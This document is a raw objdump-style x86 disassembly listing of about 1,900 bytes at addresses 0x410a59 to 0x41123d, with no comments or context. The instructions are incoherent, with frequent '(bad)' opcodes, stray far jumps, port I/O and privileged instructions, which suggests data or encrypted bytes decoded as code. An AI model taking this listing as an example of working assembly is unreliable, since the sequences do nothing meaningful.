  410a59:	and    esp,ebx
  410a5b:	shr    dl,0xd2
  410a5e:	sbb    al,0xb3
  410a60:	nop
  410a61:	xchg   edi,eax
  410a62:	mov    edi,0x4abf2835
  410a67:	sti    
  410a68:	adc    ch,cl
  410a6a:	push   ebp
  410a6b:	xor    DWORD PTR [edx],eax
  410a6d:	dec    ebp
  410a6e:	pop    esp
  410a6f:	mov    esp,0x7ea1564c
  410a74:	(bad)  
  410a75:	pop    ecx
  410a76:	clc    
  410a77:	and    al,0xea
  410a79:	pusha  
  410a7a:	fsubr  DWORD PTR [ebx+0x33]
  410a7d:	pop    ebp
  410a7e:	retf   0xbb3f
  410a81:	mov    ebp,0x1c261de7
  410a86:	mov    fs,WORD PTR [ecx+0x7a82de32]
  410a8c:	ficomp DWORD PTR [esi+ebp*1+0x79]
  410a90:	or     eax,ebx
  410a92:	push   esp
  410a93:	sti    
  410a94:	call   0xf0eb:0xa4bbe56a
  410a9b:	scas   al,BYTE PTR es:[edi]
  410a9c:	adc    BYTE PTR [edi+0x226d443e],al
  410aa2:	ret    0x55dd
  410aa5:	shr    dl,1
  410aa7:	outs   dx,DWORD PTR ds:[esi]
  410aa8:	mov    dh,cl
  410aaa:	adc    eax,0xd0b818b4
  410aaf:	daa    
  410ab0:	div    DWORD PTR [ebp+0x45f68c8c]
  410ab6:	xchg   esp,eax
  410ab7:	ins    DWORD PTR es:[edi],dx
  410ab8:	pop    ds
  410ab9:	mov    al,0x63
  410abb:	adc    ch,bh
  410abd:	repz jno 0x410af2
  410ac0:	add    al,0x6b
  410ac2:	lods   al,BYTE PTR ds:[esi]
  410ac3:	daa    
  410ac4:	and    eax,edi
  410ac6:	jmp    0x477da6ed
  410acb:	sub    BYTE PTR [eax+ebx*2+0x54],bl
  410acf:	fimul  DWORD PTR [ebx-0x4cd20a11]
  410ad5:	sbb    eax,0x73cfde18
  410ada:	dec    eax
  410adb:	cmp    BYTE PTR [edx+0x7387f8d2],al
  410ae1:	mov    al,0xae
  410ae3:	repz mov dl,0xdc
  410ae6:	pushf  
  410ae7:	sbb    eax,0x53be342
  410aec:	shl    al,1
  410aee:	or     eax,0x6073fea8
  410af3:	cmp    BYTE PTR [edx+0x32],al
  410af6:	popf   
  410af7:	adc    al,0x79
  410af9:	mov    WORD PTR [ebx],es
  410afb:	(bad)  
  410afc:	test   DWORD PTR [edx],0x46fdfb66
  410b02:	outs   dx,BYTE PTR ds:[esi]
  410b03:	rcl    BYTE PTR [edx],cl
  410b05:	aas    
  410b06:	add    DWORD PTR [ebx],edx
  410b08:	mov    eax,0x2c3202f3
  410b0d:	dec    eax
  410b0e:	sar    BYTE PTR [edx-0x345df2b3],0x6
  410b15:	es and eax,0x21c4d3c6
  410b1b:	clc    
  410b1c:	jp     0x410b8a
  410b1e:	mov    edx,0x1b6cc87f
  410b23:	mov    edx,0x287d2258
  410b28:	in     al,dx
  410b29:	or     ebp,DWORD PTR cs:[bp+si-0x3f]
  410b2e:	fstp   DWORD PTR [ecx]
  410b30:	cli    
  410b31:	xchg   edi,eax
  410b32:	scas   al,BYTE PTR es:[edi]
  410b33:	ins    BYTE PTR es:[edi],dx
  410b34:	loop   0x410b26
  410b36:	and    DWORD PTR [ebx+0x36],esp
  410b39:	ins    DWORD PTR es:[edi],dx
  410b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b3b:	xor    dh,BYTE PTR [edi]
  410b3d:	aaa    
  410b3e:	sbb    DWORD PTR [edx+0x64b4d93d],edi
  410b44:	out    dx,eax
  410b45:	jmp    0x526c:0x642c9aa4
  410b4c:	out    0xdd,al
  410b4e:	xor    BYTE PTR [edx],ah
  410b50:	stc    
  410b51:	inc    ebx
  410b52:	jge    0x410aed
  410b54:	fwait
  410b55:	scas   eax,DWORD PTR es:[edi]
  410b56:	dec    edx
  410b57:	ficomp WORD PTR [ebx]
  410b59:	pop    esp
  410b5a:	imul   ebx,ecx,0xffffff8e
  410b5d:	outs   dx,BYTE PTR fs:[esi]
  410b5f:	popa   
  410b60:	inc    esp
  410b61:	sub    esp,DWORD PTR [ecx]
  410b63:	imul   edi,edi,0x62851eb8
  410b69:	add    edi,ebx
  410b6b:	fcomp  QWORD PTR [ecx-0x62ffa49e]
  410b71:	les    ebp,FWORD PTR [esi+ebx*2-0x1f542fca]
  410b78:	sub    ebx,DWORD PTR [esi-0x4965c347]
  410b7e:	ror    ebx,cl
  410b80:	adc    eax,0x943c5d2d
  410b85:	fstp   QWORD PTR [edi+0x1e4f7908]
  410b8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b8c:	je     0x410bce
  410b8e:	and    edi,DWORD PTR [eax-0x6a]
  410b91:	cdq    
  410b92:	xchg   ecx,eax
  410b93:	mov    bl,0x25
  410b95:	clc    
  410b96:	mov    ebx,0x1cdb6ea0
  410b9b:	xor    esp,DWORD PTR [ebp+0x7b2d6e88]
  410ba1:	jne    0x410b3e
  410ba3:	xchg   esp,eax
  410ba4:	xchg   ecx,eax
  410ba5:	inc    esp
  410ba6:	jae    0x410c27
  410ba8:	stos   BYTE PTR es:[edi],al
  410ba9:	rcr    DWORD PTR [ecx+0x194a9fa8],1
  410baf:	data16 jb 0x410bff
  410bb2:	adc    BYTE PTR [edx+0x3434dcce],bl
  410bb8:	sub    dh,dh
  410bba:	pop    edx
  410bbb:	jg     0x410bb5
  410bbd:	out    dx,al
  410bbe:	jmp    0x410bb6
  410bc0:	jecxz  0x410b90
  410bc2:	mov    al,0xa
  410bc4:	jl     0x410c06
  410bc6:	mov    eax,ds:0x930552da
  410bcb:	cli    
  410bcc:	out    dx,al
  410bcd:	clc    
  410bce:	mov    cl,0xbd
  410bd0:	and    eax,0xc8fb8374
  410bd5:	mov    ds:0xbc9ed944,al
  410bda:	out    0xf0,al
  410bdc:	add    al,0x1b
  410bde:	adc    eax,0x793618ad
  410be3:	ins    DWORD PTR es:[edi],dx
  410be4:	pop    esi
  410be5:	xchg   ecx,eax
  410be6:	jne    0x410c5c
  410be8:	mov    ds:0x9536a698,al
  410bed:	add    eax,0xa952ef1a
  410bf2:	pop    edi
  410bf3:	xor    bl,dl
  410bf5:	or     DWORD PTR [esp+edi*2],ebp
  410bf8:	aaa    
  410bf9:	and    eax,0xa8990729
  410bfe:	mov    edx,0x8ad8ab4a
  410c03:	inc    edx
  410c04:	gs scas al,BYTE PTR es:[edi]
  410c06:	ret    
  410c07:	and    al,0x32
  410c09:	out    dx,eax
  410c0a:	les    esi,FWORD PTR [ecx+0x57]
  410c0d:	aam    0xe
  410c0f:	sub    DWORD PTR [ecx+0x49fe0af3],0x48cb3f34
  410c19:	in     al,0xa
  410c1b:	jno    0x410bc4
  410c1d:	mov    ebp,0xd91d9ab6
  410c22:	push   es
  410c23:	jnp    0x410bba
  410c25:	cs inc esi
  410c27:	cld    
  410c28:	jmp    0x2b210f52
  410c2d:	sti    
  410c2e:	lods   eax,DWORD PTR ds:[esi]
  410c2f:	popa   
  410c30:	jae    0x410bdd
  410c32:	sbb    eax,0xe03f4e8d
  410c37:	push   ecx
  410c38:	or     ecx,DWORD PTR [ecx+esi*1]
  410c3b:	mov    cl,0x5c
  410c3d:	xchg   ecx,eax
  410c3e:	lahf   
  410c3f:	adc    al,0xb
  410c41:	xchg   eax,ecx
  410c43:	jno    0x410c34
  410c45:	jo     0x410c90
  410c47:	inc    ebx
  410c48:	mov    ?,WORD PTR [eax-0x8]
  410c4b:	cs repnz sub al,dl
  410c4f:	sbb    DWORD PTR [esi+0x6d],edi
  410c52:	inc    eax
  410c53:	sub    BYTE PTR [eax-0x4d],al
  410c56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c57:	push   ebx
  410c58:	mov    ecx,0x6e509db0
  410c5d:	jnp    0x410c60
  410c5f:	jl     0x410bf4
  410c61:	push   ss
  410c62:	jmp    0x410c90
  410c64:	dec    esi
  410c65:	jle    0x410c54
  410c67:	stos   DWORD PTR es:[edi],eax
  410c68:	cmp    edx,DWORD PTR [edi-0x7c93731e]
  410c6e:	test   eax,0xb46e949a
  410c73:	in     eax,0x99
  410c75:	jns    0x410cae
  410c77:	ffree  st(1)
  410c79:	jns    0x410c57
  410c7b:	out    dx,eax
  410c7c:	xlat   BYTE PTR ds:[ebx]
  410c7d:	push   ss
  410c7e:	addr16 pop esp
  410c80:	push   ebp
  410c81:	jg     0x410c35
  410c83:	fs mov cs,edi
  410c86:	or     dh,BYTE PTR [ecx+0x2b39c85d]
  410c8c:	inc    ebx
  410c8d:	(bad)  
  410c8e:	pop    eax
  410c8f:	xchg   esi,eax
  410c90:	mov    DWORD PTR [eax+0x6d4ca99f],edx
  410c96:	cmp    DWORD PTR [ebp+0x6d2ba67],edi
  410c9c:	push   edx
  410c9d:	pop    edx
  410c9e:	shr    DWORD PTR [ebp+0x57],cl
  410ca1:	inc    esi
  410ca2:	rcl    dl,1
  410ca4:	push   ds
  410ca5:	sub    eax,0xf0891fd
  410caa:	mov    ebp,?
  410cac:	adc    DWORD PTR [edx-0x47],esp
  410caf:	jo     0x410c8c
  410cb1:	or     DWORD PTR [edi-0x38f388e9],esp
  410cb7:	push   ecx
  410cb8:	and    eax,eax
  410cba:	jbe    0x410cdf
  410cbc:	fcomp  st(2)
  410cbe:	ins    DWORD PTR es:[edi],dx
  410cbf:	inc    eax
  410cc0:	retfw  0x530
  410cc4:	mov    ?,WORD PTR [eax-0x6ed3847]
  410cca:	loope  0x410c9c
  410ccc:	loopne 0x410c50
  410cce:	call   0x6f1a1599
  410cd3:	data16 jp 0x410cf0
  410cd6:	push   esi
  410cd7:	and    DWORD PTR ds:0x96bdee81,0xdad30a8
  410ce1:	pop    ebp
  410ce2:	mov    WORD PTR [ebp-0x3d],?
  410ce5:	dec    esp
  410ce6:	mov    ds:0x837bdc0c,eax
  410ceb:	mov    BYTE PTR [esi+0x794da834],ch
  410cf1:	imul   ebx,DWORD PTR [ebx+0x2e20cc29],0xc34a6cd6
  410cfb:	mov    WORD PTR [edi],gs
  410cfd:	sub    dh,ah
  410cff:	inc    edi
  410d00:	cmp    eax,0x21f3618e
  410d05:	fst    st(1)
  410d07:	mov    eax,0xb72b1478
  410d0c:	lods   eax,DWORD PTR ds:[esi]
  410d0d:	dec    ebp
  410d0e:	int    0xdf
  410d10:	mov    ch,0x56
  410d12:	add    DWORD PTR [ebp-0x78],0x78
  410d16:	js     0x410ceb
  410d18:	mov    edx,0x880cdc83
  410d1d:	jnp    0x410cff
  410d1f:	(bad)  
  410d20:	sub    esp,ebx
  410d22:	mov    edi,0x94546d8a
  410d27:	push   0xa1c2dd7d
  410d2c:	mov    al,ds:0x426d0175
  410d31:	mov    ecx,0x51ae4ed
  410d36:	push   ebp
  410d37:	int    0x99
  410d39:	das    
  410d3a:	scas   al,BYTE PTR es:[edi]
  410d3b:	cmp    eax,0xabf794ee
  410d40:	xchg   esp,eax
  410d41:	arpl   WORD PTR [edx+0x7],dx
  410d44:	add    dh,dh
  410d46:	cmp    al,BYTE PTR [ebp+edx*2-0x53b875c]
  410d4d:	mov    bl,0x41
  410d4f:	outs   dx,BYTE PTR ds:[esi]
  410d50:	ss mov dl,0xe6
  410d53:	test   BYTE PTR [edx+0x12],bl
  410d56:	sbb    BYTE PTR [ecx+edx*4-0x52b17e23],0x31
  410d5e:	mov    WORD PTR [eax+edi*4+0x6c],cs
  410d62:	mov    edx,edx
  410d64:	retf   
  410d65:	jo     0x410d15
  410d67:	repnz ss cli 
  410d6a:	les    ebx,FWORD PTR [ebp-0x71d972a9]
  410d70:	mov    ecx,0x65abc2c
  410d75:	mov    BYTE PTR [eax+0x2e512ec2],ch
  410d7b:	sub    DWORD PTR [edi+ebp*1-0x7a],ebx
  410d7f:	(bad)  
  410d80:	xor    eax,0x370de65f
  410d85:	outs   dx,DWORD PTR ds:[esi]
  410d86:	mov    ch,cl
  410d88:	daa    
  410d89:	mov    esi,0xba6321f0
  410d8e:	rol    dh,1
  410d90:	pop    ebp
  410d91:	push   esi
  410d92:	jge    0x410d71
  410d94:	pop    edx
  410d95:	or     BYTE PTR [eax],ch
  410d97:	mov    eax,0x3aa1b4b9
  410d9c:	rcr    BYTE PTR [esp+ebp*4+0x3b5ab501],0x18
  410da4:	push   esi
  410da5:	ins    BYTE PTR es:[edi],dx
  410da6:	xor    DWORD PTR [eax+0xf],0xfe29d5e
  410dad:	aam    0x0
  410daf:	ja     0x410d9c
  410db1:	lods   al,BYTE PTR ds:[esi]
  410db2:	mov    bl,0xcd
  410db4:	shl    BYTE PTR [esi],1
  410db6:	add    esi,esi
  410db8:	pop    edx
  410db9:	sahf   
  410dba:	xor    DWORD PTR [esi-0x43],ebx
  410dbd:	xchg   esi,eax
  410dbe:	adc    bh,BYTE PTR [edx+eax*8+0x66]
  410dc2:	mov    bh,0x46
  410dc4:	pop    eax
  410dc5:	xchg   edi,eax
  410dc6:	enter  0xd71f,0x81
  410dca:	out    0x90,eax
  410dcc:	xchg   edx,eax
  410dcd:	dec    ebx
  410dce:	mov    ebx,0x80280cd9
  410dd3:	cmp    DWORD PTR [ebx-0x4e],esi
  410dd6:	hlt    
  410dd7:	in     eax,dx
  410dd8:	jge    0x410db6
  410dda:	mov    dh,bl
  410ddc:	call   0x351db14a
  410de1:	ins    DWORD PTR es:[edi],dx
  410de2:	mov    WORD PTR [ecx],gs
  410de4:	arpl   WORD PTR [eax-0x59086203],bp
  410dea:	rcr    DWORD PTR [ebx],0xc7
  410ded:	data16 icebp 
  410def:	mov    eax,ds:0xfa975814
  410df4:	loop   0x410de7
  410df6:	pop    edi
  410df7:	xor    al,0xdd
  410df9:	pop    eax
  410dfa:	ins    DWORD PTR es:[edi],dx
  410dfb:	data16 (bad) 
  410dfd:	push   ebx
  410dfe:	scas   al,BYTE PTR es:[edi]
  410dff:	xchg   ecx,eax
  410e00:	adc    DWORD PTR [ecx-0x74],ecx
  410e03:	push   ds
  410e04:	das    
  410e05:	push   edi
  410e06:	lods   al,BYTE PTR ds:[esi]
  410e07:	mov    al,0x4e
  410e09:	sub    eax,0xcc187b82
  410e0e:	lods   eax,DWORD PTR ds:[esi]
  410e0f:	xchg   ecx,eax
  410e10:	push   es
  410e11:	ins    BYTE PTR es:[edi],dx
  410e12:	xor    dl,BYTE PTR [esi+0x705e552c]
  410e18:	aad    0xfc
  410e1a:	or     al,0xec
  410e1c:	xor    esp,DWORD PTR [edx+0x29ed9edb]
  410e22:	mov    cl,BYTE PTR [edx-0x35]
  410e25:	mov    DWORD PTR [edx-0x1da23e1e],ecx
  410e2b:	fisttp WORD PTR [ebp+0x50cae036]
  410e31:	adc    al,0x61
  410e33:	leave  
  410e34:	jmp    0x144e:0x44a95a6
  410e3b:	sbb    eax,DWORD PTR [esi-0x6a55b6cf]
  410e41:	sahf   
  410e42:	sbb    al,0x28
  410e44:	add    ecx,DWORD PTR [ebp-0x3de574be]
  410e4a:	dec    edx
  410e4b:	adc    eax,0x6a5df4a6
  410e50:	cmp    bh,ah
  410e52:	sti    
  410e53:	cmp    ecx,eax
  410e55:	and    eax,0x4e18defc
  410e5a:	xchg   esp,eax
  410e5b:	add    esi,DWORD PTR [esi-0x79]
  410e5e:	mov    bh,0xf3
  410e60:	stc    
  410e61:	(bad)  
  410e62:	repnz (bad) 
  410e64:	daa    
  410e65:	daa    
  410e66:	inc    esi
  410e67:	ss stos DWORD PTR es:[edi],eax
  410e69:	test   al,0x55
  410e6b:	mov    ds:0xb08cb1db,eax
  410e70:	loop   0x410eec
  410e72:	lods   eax,DWORD PTR ds:[esi]
  410e73:	add    BYTE PTR [esi-0x688d3d24],cl
  410e79:	dec    ebx
  410e7a:	dec    edi
  410e7b:	or     esi,DWORD PTR [esi]
  410e7d:	xlat   BYTE PTR ds:[ebx]
  410e7e:	jo     0x410e2a
  410e80:	les    eax,FWORD PTR [esi-0x39cf891]
  410e86:	sbb    eax,0x46f96cf4
  410e8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e8c:	add    bh,dl
  410e8e:	xchg   esp,eax
  410e8f:	mov    ds:0x68149d5c,eax
  410e94:	or     al,0xe9
  410e96:	test   al,0x93
  410e98:	loop   0x410e5f
  410e9a:	repnz das 
  410e9c:	and    BYTE PTR [eax],bl
  410e9e:	stos   DWORD PTR es:[edi],eax
  410e9f:	cwde   
  410ea0:	imul   ebx,ebx,0x2fd9768d
  410ea6:	daa    
  410ea7:	int3   
  410ea8:	loop   0x410e54
  410eaa:	retf   
  410eab:	sub    DWORD PTR [esi-0x6d999ed2],ebx
  410eb1:	imul   eax,ebx,0x304f7b1e
  410eb7:	outs   dx,BYTE PTR ds:[esi]
  410eb8:	test   al,0xa6
  410eba:	adc    BYTE PTR es:[esi+0x50],0xc7
  410ebf:	ins    BYTE PTR es:[edi],dx
  410ec0:	imul   eax,DWORD PTR [ecx+0x60],0x6cb8344d
  410ec7:	rcr    BYTE PTR [edx],0x4c
  410eca:	dec    ebp
  410ecb:	add    eax,0x5735ffae
  410ed0:	(bad)  
  410ed2:	into   
  410ed3:	add    dl,BYTE PTR [edx+0x752182db]
  410ed9:	sahf   
  410eda:	je     0x410e79
  410edc:	fistp  DWORD PTR [edx-0x4c0394b3]
  410ee2:	and    BYTE PTR [edx-0x3cefdfd2],ah
  410ee8:	aam    0xc7
  410eea:	fistp  DWORD PTR [ecx+ecx*1-0x12adc427]
  410ef1:	pop    ebx
  410ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ef3:	push   edx
  410ef4:	call   0x550de63a
  410ef9:	inc    eax
  410efa:	mov    esp,0x4f1e7e8b
  410eff:	jae    0x410e82
  410f01:	mov    DWORD PTR [edi+eiz*8-0x71],0xfaf8e5c7
  410f09:	mov    cl,0x27
  410f0b:	outs   dx,BYTE PTR ds:[esi]
  410f0c:	test   eax,edx
  410f0e:	jmp    0xf82c:0x681be840
  410f15:	cdq    
  410f16:	pop    eax
  410f17:	xchg   esi,eax
  410f18:	mov    bl,0x1f
  410f1a:	jp     0x410ecc
  410f1c:	mov    ecx,0x29f13a18
  410f21:	in     eax,0x67
  410f23:	adc    BYTE PTR [eax],bh
  410f25:	jo     0x410f7a
  410f27:	add    al,0x5f
  410f29:	(bad)  
  410f2a:	xcrypt-cbc (bad)
  410f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f2c:	adc    al,dh
  410f2e:	fisttp DWORD PTR [edx]
  410f30:	add    al,0xb
  410f32:	dec    eax
  410f33:	not    BYTE PTR [edi+0x2b2fed1c]
  410f39:	lods   eax,DWORD PTR ds:[esi]
  410f3a:	pop    ebp
  410f3b:	sbb    eax,0xd0a1eb2c
  410f40:	and    bl,dh
  410f42:	sub    al,0xb6
  410f44:	repz inc ecx
  410f46:	inc    edi
  410f47:	gs cdq 
  410f49:	inc    esi
  410f4a:	hlt    
  410f4b:	mov    al,0xb3
  410f4d:	inc    ebx
  410f4e:	adc    DWORD PTR [eax+0x2f],esi
  410f51:	ins    BYTE PTR es:[edi],dx
  410f52:	xor    eax,0xe5a115bb
  410f57:	in     al,dx
  410f58:	sti    
  410f59:	sub    BYTE PTR ds:0xc1e9ebc2,dh
  410f5f:	(bad)  
  410f60:	repnz pop es
  410f62:	idiv   DWORD PTR [edi+0x4b]
  410f65:	into   
  410f66:	mov    ah,0x95
  410f68:	jl     0x410f66
  410f6a:	pop    ds
  410f6b:	dec    eax
  410f6c:	push   ebx
  410f6d:	repz std 
  410f6f:	sbb    al,0xb1
  410f71:	dec    ebx
  410f72:	retf   
  410f73:	cmp    bh,BYTE PTR [ebp+0x18]
  410f76:	jnp    0x410f24
  410f78:	pop    ss
  410f79:	or     ecx,DWORD PTR [ecx+0x69]
  410f7c:	in     eax,0xcd
  410f7e:	call   0xbf89:0x8edda976
  410f85:	jns    0x410fc5
  410f87:	adc    ecx,ebp
  410f89:	push   eax
  410f8a:	adc    al,0x13
  410f8c:	int    0xa6
  410f8e:	inc    ebp
  410f8f:	adc    al,BYTE PTR ds:0x8db7460c
  410f95:	pop    edx
  410f96:	jg     0x410f64
  410f98:	lea    esp,[esi]
  410f9a:	sbb    BYTE PTR [esi-0x40faa814],0x2c
  410fa1:	add    cl,BYTE PTR [eax]
  410fa3:	in     eax,dx
  410fa4:	push   eax
  410fa5:	lds    edx,FWORD PTR [ebp-0x21747e53]
  410fab:	xor    DWORD PTR [ebp-0x4b7f020f],0xe
  410fb2:	test   ah,bl
  410fb4:	pop    es
  410fb5:	std    
  410fb6:	imul   ebx,DWORD PTR [edi],0xffffffbf
  410fb9:	sub    BYTE PTR [ebx+0x7a4ca78e],cl
  410fbf:	dec    eax
  410fc0:	js     0x410feb
  410fc2:	xchg   esp,eax
  410fc3:	add    eax,0xd14b0d4a
  410fc8:	jp     0x410fcc
  410fca:	mov    dh,0x81
  410fcc:	add    BYTE PTR [ebp+0x28a44bf],dh
  410fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fd3:	dec    ecx
  410fd4:	pop    esp
  410fd5:	sahf   
  410fd6:	neg    cl
  410fd8:	dec    ebx
  410fd9:	mov    eax,ds:0x3271fb22
  410fde:	xor    eax,0x9cb9313b
  410fe3:	out    0x71,eax
  410fe5:	mov    dl,0xf1
  410fe7:	cmp    eax,0x3bd4ffdf
  410fec:	mov    edi,cs
  410fee:	pop    es
  410fef:	and    al,0x94
  410ff1:	xchg   esi,eax
  410ff2:	shr    BYTE PTR [eax],0x8b
  410ff5:	hlt    
  410ff6:	icebp  
  410ff7:	mov    edx,0xabc2d0cf
  410ffc:	mov    ds:0x7b333529,eax
  411001:	cli    
  411002:	aad    0x65
  411004:	xchg   ecx,eax
  411005:	mov    BYTE PTR [edi],bl
  411007:	xor    ah,BYTE PTR [edi]
  411009:	mov    al,0x19
  41100b:	inc    edi
  41100c:	ds ja  0x41105c
  41100f:	call   0xaaf1e51
  411014:	jmp    0x411007
  411016:	cli    
  411017:	mov    ah,0xfa
  411019:	push   ebx
  41101a:	inc    ecx
  41101b:	gs (bad) 
  41101d:	stc    
  41101e:	push   ebx
  41101f:	jp     0x411005
  411021:	sub    DWORD PTR ss:[esp+eiz*8],esp
  411025:	jae    0x411070
  411027:	and    al,0xe7
  411029:	ret    
  41102a:	not    bl
  41102c:	sbb    esp,eax
  41102e:	call   0x2f76:0x57cd601a
  411035:	fdivr  QWORD PTR [ecx]
  411037:	nop
  411038:	push   cs
  411039:	mov    bh,bl
  41103b:	cmp    BYTE PTR [eax+0x2e],dl
  41103e:	jecxz  0x4110ae
  411040:	mov    edx,0xe588e76b
  411045:	xor    DWORD PTR ds:[edx+eiz*4-0x8],ebp
  41104a:	adc    al,0x9e
  41104c:	xor    BYTE PTR [edx-0x2],bl
  41104f:	fsub   DWORD PTR [edx-0x4feaf13]
  411055:	dec    ebx
  411056:	xor    al,0x43
  411058:	mov    edx,DWORD PTR [ebx+0x58fbf798]
  41105e:	inc    ebx
  41105f:	mov    ch,cl
  411061:	into   
  411062:	inc    ebp
  411063:	add    eax,0x97df6c92
  411068:	mov    ds:0x41d3b987,al
  41106d:	add    dh,ch
  41106f:	ins    BYTE PTR es:[edi],dx
  411070:	mov    dh,0xd5
  411072:	popa   
  411073:	test   eax,0x2d1ec860
  411078:	and    cl,dl
  41107a:	aas    
  41107b:	inc    esi
  41107c:	out    0x32,al
  41107e:	xor    cl,BYTE PTR [edx]
  411080:	(bad)  [eax+0x2a]
  411083:	das    
  411084:	xor    BYTE PTR [esi-0x68a93913],0x76
  41108b:	aam    0x99
  41108d:	mov    WORD PTR [edx+0xf],ss
  411090:	cdq    
  411091:	pop    eax
  411092:	fmul   QWORD PTR [edi+eax*1-0x5f]
  411096:	bound  edx,QWORD PTR [edi-0x20]
  411099:	imul   edx,DWORD PTR [eax+0x25],0x13
  41109d:	push   0xc2071883
  4110a2:	inc    ecx
  4110a3:	or     eax,0xfbcca051
  4110a8:	test   ecx,edi
  4110aa:	and    eax,0xba3b51fe
  4110af:	jl     0x411129
  4110b1:	sub    dh,bh
  4110b3:	pop    DWORD PTR [edi+0x23]
  4110b6:	mov    ebx,DWORD PTR ds:0x5f6bfe06
  4110bc:	sbb    bh,BYTE PTR [edi]
  4110be:	mov    ecx,0xb1168c92
  4110c3:	popa   
  4110c4:	pushf  
  4110c5:	outs   dx,DWORD PTR ds:[esi]
  4110c6:	sysenter 
  4110c8:	push   DWORD PTR [ecx-0x74832a8d]
  4110ce:	pop    edx
  4110cf:	aad    0xa6
  4110d1:	sbb    eax,0x95454aa2
  4110d6:	pop    eax
  4110d7:	pusha  
  4110d8:	dec    ebx
  4110d9:	jmp    0x57a523f6
  4110de:	popa   
  4110df:	ficomp WORD PTR gs:[edi]
  4110e2:	mov    ebp,0x734ef2bf
  4110e7:	sbb    BYTE PTR [esp+edi*8],bh
  4110ea:	adc    ecx,edi
  4110ec:	xor    edx,DWORD PTR [ebx-0x2d001c9f]
  4110f2:	pop    ecx
  4110f3:	pop    esi
  4110f4:	bound  ecx,QWORD PTR [edi*8+0x72b757ee]
  4110fb:	sbb    al,0x88
  4110fd:	jmp    0x41108e
  4110ff:	sti    
  411100:	mov    esp,0xe36e1c24
  411105:	lods   eax,DWORD PTR ds:[esi]
  411106:	and    BYTE PTR [edx-0x46],0x95
  41110a:	push   0xfffffff1
  41110c:	xchg   ebp,eax
  41110d:	jmp    FWORD PTR [edi-0x3b59eb8a]
  411113:	out    dx,eax
  411114:	xor    ecx,edx
  411116:	inc    ecx
  411117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411118:	xchg   edi,eax
  411119:	xchg   esi,eax
  41111a:	mov    dh,0x59
  41111c:	and    al,bl
  41111e:	(bad)  
  41111f:	ins    DWORD PTR es:[edi],dx
  411120:	loope  0x411177
  411122:	shl    bh,0xb9
  411125:	dec    eax
  411126:	push   edi
  411127:	mov    ebp,0xd7b7841f
  41112c:	and    al,0xf4
  41112e:	sahf   
  41112f:	sbb    DWORD PTR [edi-0x2797d156],esi
  411135:	xor    esi,esi
  411137:	lock sub edx,0xb9e3a8da
  41113e:	sti    
  41113f:	and    al,BYTE PTR [edi+0x2fa01301]
  411145:	outs   dx,BYTE PTR ds:[esi]
  411146:	or     bh,ah
  411148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411149:	rol    BYTE PTR [ebp+0x36],cl
  41114c:	pushf  
  41114d:	shl    DWORD PTR [edx+0x6e],cl
  411150:	mov    ah,0x9
  411152:	jl     0x41117d
  411154:	inc    eax
  411155:	clc    
  411156:	aam    0x97
  411158:	outs   dx,BYTE PTR ds:[esi]
  411159:	mov    eax,ds:0x4a35e9cf
  41115e:	arpl   WORD PTR [ebx],sp
  411160:	jge    0x4110f2
  411162:	push   0xcad4d0d
  411167:	push   0x84e03998
  41116c:	scas   eax,DWORD PTR es:[edi]
  41116d:	popf   
  41116e:	cmp    ecx,DWORD PTR [edi]
  411170:	adc    DWORD PTR [ecx+ebp*8-0x10],esi
  411174:	mov    al,0xa6
  411176:	(bad)  
  411177:	lods   eax,DWORD PTR ds:[esi]
  411178:	or     BYTE PTR [ecx],dl
  41117a:	cmp    eax,0x2f679f9f
  41117f:	iret   
  411180:	jge    0x411195
  411182:	inc    ecx
  411183:	push   es
  411184:	jmp    0xcab200e4
  411189:	rol    BYTE PTR [esi-0x11],cl
  41118c:	mov    al,ds:0x22a63200
  411191:	daa    
  411192:	scas   al,BYTE PTR es:[edi]
  411193:	push   0xd300d316
  411198:	jo     0x4111e8
  41119a:	fwait
  41119b:	mov    ecx,0xae2c2be5
  4111a0:	pop    es
  4111a1:	xchg   ecx,eax
  4111a2:	mov    dl,0x7f
  4111a4:	inc    ebp
  4111a5:	daa    
  4111a6:	cmp    al,0xe9
  4111a8:	and    al,0x1c
  4111aa:	aas    
  4111ab:	cs jbe 0x411229
  4111ae:	lea    ebp,[edi-0x45151674]
  4111b4:	and    eax,0x81ec5f9c
  4111b9:	jle    0x4111b9
  4111bb:	test   eax,0x58b1c758
  4111c0:	dec    edi
  4111c1:	ficom  WORD PTR [esi]
  4111c3:	stos   DWORD PTR es:[edi],eax
  4111c4:	mov    al,0xe0
  4111c6:	cs hlt 
  4111c8:	(bad)  
  4111c9:	add    DWORD PTR [ebp+0x4f92a3f9],esp
  4111cf:	push   0xffffff94
  4111d1:	das    
  4111d2:	cmp    al,0x16
  4111d4:	aam    0x9d
  4111d6:	or     eax,0x4934b305
  4111db:	loope  0x41125c
  4111dd:	cmp    eax,0x47615de1
  4111e2:	push   esi
  4111e3:	test   DWORD PTR [eax+0x4f9b6e27],esp
  4111e9:	xor    eax,0xb762d95
  4111ee:	andps  xmm1,XMMWORD PTR [esi-0x42]
  4111f2:	or     eax,0x7b49bed2
  4111f7:	test   eax,0xe0dfd438
  4111fc:	mov    dl,0x5b
  4111fe:	xor    ebp,esi
  411200:	and    esi,DWORD PTR [edi+edx*8]
  411203:	and    BYTE PTR [ecx-0x44070f1b],0xd0
  41120a:	rol    DWORD PTR [ecx-0x65],1
  41120d:	cmp    DWORD PTR [ecx+0x6f4ee905],esi
  411213:	cmp    esi,DWORD PTR [ecx]
  411215:	add    cl,BYTE PTR [edi]
  411217:	shl    DWORD PTR [eax+0x14],0xb
  41121b:	pop    ebx
  41121c:	jge    0x4111e3
  41121e:	cmp    eax,DWORD PTR [ebp+0x58681be]
  411224:	mov    ah,0x15
  411226:	add    ebp,DWORD PTR [ecx-0x698ba838]
  41122c:	ss cdq 
  41122e:	int    0xbf
  411230:	les    edi,FWORD PTR [eax+0xed48197]
  411236:	enter  0x5d0c,0xed
  41123a:	ins    BYTE PTR es:[edi],dx
  41123b:	adc    ecx,DWORD PTR [edi]
  41123d:	xor    ah,ah
